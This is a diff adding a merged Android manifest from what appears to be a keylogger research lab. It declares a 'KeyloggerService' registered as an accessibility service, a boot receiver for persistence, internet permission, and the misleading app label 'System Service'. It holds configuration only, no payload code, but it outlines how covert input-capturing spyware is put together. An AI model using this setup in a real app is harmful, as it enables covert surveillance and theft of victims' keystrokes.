@@ -1,0 +1,128 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.security.research.phonemonitor"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="26"
+9        android:targetSdkVersion="34" />
+10
+11    <uses-permission android:name="android.permission.INTERNET" />
+11-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:4:5-67
+11-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:4:22-64
+12    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+12-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:5:5-81
+12-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:5:22-78
+13    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+13-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:6:5-77
+13-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:6:22-74
+14
+15    <permission
+15-->[androidx.core:core:1.12.0] /home/arch/.gradle/caches/8.9/transforms/8cb5a8d075a4329a41709bfd3a7aa7b4/transformed/core-1.12.0/AndroidManifest.xml:22:5-24:47
+16        android:name="com.security.research.phonemonitor.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+16-->[androidx.core:core:1.12.0] /home/arch/.gradle/caches/8.9/transforms/8cb5a8d075a4329a41709bfd3a7aa7b4/transformed/core-1.12.0/AndroidManifest.xml:23:9-81
+17        android:protectionLevel="signature" />
+17-->[androidx.core:core:1.12.0] /home/arch/.gradle/caches/8.9/transforms/8cb5a8d075a4329a41709bfd3a7aa7b4/transformed/core-1.12.0/AndroidManifest.xml:24:9-44
+18
+19    <uses-permission android:name="com.security.research.phonemonitor.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+19-->[androidx.core:core:1.12.0] /home/arch/.gradle/caches/8.9/transforms/8cb5a8d075a4329a41709bfd3a7aa7b4/transformed/core-1.12.0/AndroidManifest.xml:26:5-97
+19-->[androidx.core:core:1.12.0] /home/arch/.gradle/caches/8.9/transforms/8cb5a8d075a4329a41709bfd3a7aa7b4/transformed/core-1.12.0/AndroidManifest.xml:26:22-94
+20
+21    <application
+21-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:8:5-45:19
+22        android:allowBackup="false"
+22-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:9:9-36
+23        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+23-->[androidx.core:core:1.12.0] /home/arch/.gradle/caches/8.9/transforms/8cb5a8d075a4329a41709bfd3a7aa7b4/transformed/core-1.12.0/AndroidManifest.xml:28:18-86
+24        android:debuggable="true"
+25        android:extractNativeLibs="false"
+26        android:label="System Service"
+26-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:10:9-39
+27        android:networkSecurityConfig="@xml/network_security_config"
+27-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:11:9-69
+28        android:supportsRtl="true"
+28-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:12:9-35
+29        android:theme="@style/Theme.PhoneMonitor" >
+29-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:13:9-50
+30        <activity
+30-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:15:9-22:20
+31            android:name="com.security.research.phonemonitor.MainActivity"
+31-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:16:13-41
+32            android:exported="true" >
+32-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:17:13-36
+33            <intent-filter>
+33-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:18:13-21:29
+34                <action android:name="android.intent.action.MAIN" />
+34-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:19:17-69
+34-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:19:25-66
+35
+36                <category android:name="android.intent.category.LAUNCHER" />
+36-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:20:17-77
+36-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:20:27-74
+37            </intent-filter>
+38        </activity>
+39
+40        <service
+40-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:24:9-35:19
+41            android:name="com.security.research.phonemonitor.KeyloggerService"
+41-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:25:13-45
+42            android:exported="true"
+42-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:26:13-36
+43            android:label="System Service"
+43-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:27:13-43
+44            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+44-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:28:13-79
+45            <intent-filter>
+45-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:29:13-31:29
+46                <action android:name="android.accessibilityservice.AccessibilityService" />
+46-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:30:17-92
+46-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:30:25-89
+47            </intent-filter>
+48
+49            <meta-data
+49-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:32:13-34:72
+50                android:name="android.accessibilityservice"
+50-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:33:17-60
+51                android:resource="@xml/accessibility_service_config" />
+51-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:34:17-69
+52        </service>
+53
+54        <receiver
+54-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:37:9-43:20
+55            android:name="com.security.research.phonemonitor.BootReceiver"
+55-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:38:13-41
+56            android:exported="true" >
+56-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:39:13-36
+57            <intent-filter>
+57-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:40:13-42:29
+58                <action android:name="android.intent.action.BOOT_COMPLETED" />
+58-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:41:17-79
+58-->/home/arch/keylogger-lab-v2/android-app/app/src/main/AndroidManifest.xml:41:25-76
+59            </intent-filter>
+60        </receiver>
+61
+62        <provider
+62-->[androidx.emoji2:emoji2:1.2.0] /home/arch/.gradle/caches/8.9/transforms/dfc4ff59018e59e8b1255a23c96f4e32/transformed/emoji2-1.2.0/AndroidManifest.xml:24:9-32:20
+63            android:name="androidx.startup.InitializationProvider"
+63-->[androidx.emoji2:emoji2:1.2.0] /home/arch/.gradle/caches/8.9/transforms/dfc4ff59018e59e8b1255a23c96f4e32/transformed/emoji2-1.2.0/AndroidManifest.xml:25:13-67
+64            android:authorities="com.security.research.phonemonitor.androidx-startup"
+64-->[androidx.emoji2:emoji2:1.2.0] /home/arch/.gradle/caches/8.9/transforms/dfc4ff59018e59e8b1255a23c96f4e32/transformed/emoji2-1.2.0/AndroidManifest.xml:26:13-68
+65            android:exported="false" >
+65-->[androidx.emoji2:emoji2:1.2.0] /home/arch/.gradle/caches/8.9/transforms/dfc4ff59018e59e8b1255a23c96f4e32/transformed/emoji2-1.2.0/AndroidManifest.xml:27:13-37
+66            <meta-data
+66-->[androidx.emoji2:emoji2:1.2.0] /home/arch/.gradle/caches/8.9/transforms/dfc4ff59018e59e8b1255a23c96f4e32/transformed/emoji2-1.2.0/AndroidManifest.xml:29:13-31:52
+67                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+67-->[androidx.emoji2:emoji2:1.2.0] /home/arch/.gradle/caches/8.9/transforms/dfc4ff59018e59e8b1255a23c96f4e32/transformed/emoji2-1.2.0/AndroidManifest.xml:30:17-75
+68                android:value="androidx.startup" />
+68-->[androidx.emoji2:emoji2:1.2.0] /home/arch/.gradle/caches/8.9/transforms/dfc4ff59018e59e8b1255a23c96f4e32/transformed/emoji2-1.2.0/AndroidManifest.xml:31:17-49
+69            <meta-data
+69-->[androidx.lifecycle:lifecycle-process:2.4.1] /home/arch/.gradle/caches/8.9/transforms/0186c4a6f83813d027f4100a1fa20d47/transformed/lifecycle-process-2.4.1/AndroidManifest.xml:31:13-33:52
+70                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+70-->[androidx.lifecycle:lifecycle-process:2.4.1] /home/arch/.gradle/caches/8.9/transforms/0186c4a6f83813d027f4100a1fa20d47/transformed/lifecycle-process-2.4.1/AndroidManifest.xml:32:17-78
+71                android:value="androidx.startup" />
+71-->[androidx.lifecycle:lifecycle-process:2.4.1] /home/arch/.gradle/caches/8.9/transforms/0186c4a6f83813d027f4100a1fa20d47/transformed/lifecycle-process-2.4.1/AndroidManifest.xml:33:17-49
+72        </provider>
+73    </application>
+74
+75</manifest>
